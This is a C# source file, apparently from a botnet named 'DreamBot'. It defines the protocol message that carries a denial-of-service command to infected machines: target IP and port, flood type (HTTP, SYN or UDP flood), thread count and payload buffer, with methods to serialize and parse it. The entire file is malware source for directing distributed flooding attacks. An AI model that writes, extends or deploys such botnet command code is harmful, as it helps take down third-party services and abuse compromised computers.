using System.IO;
using System.Net;

namespace DreamBot.Network.Protocol.Messages.Command
{
    class DosAttackMessage : CommandMessage
    {
        internal enum DosType
        {
            HttpFlood,
            SynFlood,
            UdpFlood
        }

        public long AttackId { get; set; }
        public IPEndPoint Target { get; set; }
        public DosType Type { get; set; }
        public short Threads { get; set; }
        public byte[] Buffer { get; set; }

        public override void EncodePayload(BinaryWriter w)
        {
            w.Write(AttackId);
            w.Write(Target.Address.GetAddressBytes());
            w.Write((short)Target.Port);
            w.Write((byte)Type);
            w.Write(Threads);
            w.Write(Buffer.Length);
            w.Write(Buffer);
        }

        public override void DecodePayload(BinaryReader br)
        {
            AttackId = br.ReadInt64();
            Target = new IPEndPoint(new IPAddress(br.ReadBytes(4)), br.ReadInt16());
            Type = (DosType)br.ReadByte();
            Threads = br.ReadInt16();
            var len = br.ReadInt32();
            Buffer = br.ReadBytes(len);
        }
    }
}